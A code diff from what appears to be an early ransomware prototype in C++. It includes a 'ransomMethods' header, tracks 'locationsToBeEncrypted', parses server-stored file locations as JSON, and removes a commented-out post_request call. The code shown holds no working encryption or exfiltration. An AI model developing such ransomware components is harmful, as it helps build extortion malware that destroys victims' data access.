@@ -3,7 +3,9 @@
 #include <fstream>
 #include <sstream>
 #include <vector>
-#include "ransomMethods.h"
+#include "ransomMethods.h" //TODO - leave declarations in here.
+
+#include "headers/json.hpp"
 
 
 
@@ -22,7 +24,16 @@ int main(){
 	//Reads the locations from the local fileLocation file into a string vector. Then reads contents into its own vector of string vectors.
 	bool success = getFileContents("fileLocations", fileLocationsVector);
 
-	// TODO - Move to Function. Compares fileLocationsVector with serverStoredLocationsRaw and removes already stored locations.
+
+	nlohmann::json j_complete = nlohmann::json::parse(serverStoredLocationsRaw);
+	
+	for(auto& a : j_complete["locations"]){
+		std::cout << a["location"] << std::endl;
+	}
+
+
+
+/*	// TODO - Move to Function. Compares fileLocationsVector with serverStoredLocationsRaw and removes already stored locations.
 	for(int i = 0; i < fileLocationsVector.size(); i++){
     	for(int j = 0; j < serverLocationsVector.size(); j++){
     		if(fileLocationsVector[i].compare(serverLocationsVector[j]) != 0){    			
@@ -65,26 +76,16 @@ int main(){
 			}
 			myFile.close();			
 		}	
-
     }
-    
-    
-    //post_request("ddddddddddddsdsdsdddddddddd");
+
+    for(auto& a : locationsToBeEncrypted){
+    	std::cout << a;
+    }*/
 
 
 
 
-
-
-
-
-
-
-	
-
-
-	
-
+ 
 
 
 	/*	// DECRYPT - Basic encryption. Just decrements by one. Will change for asymmetric decryption.
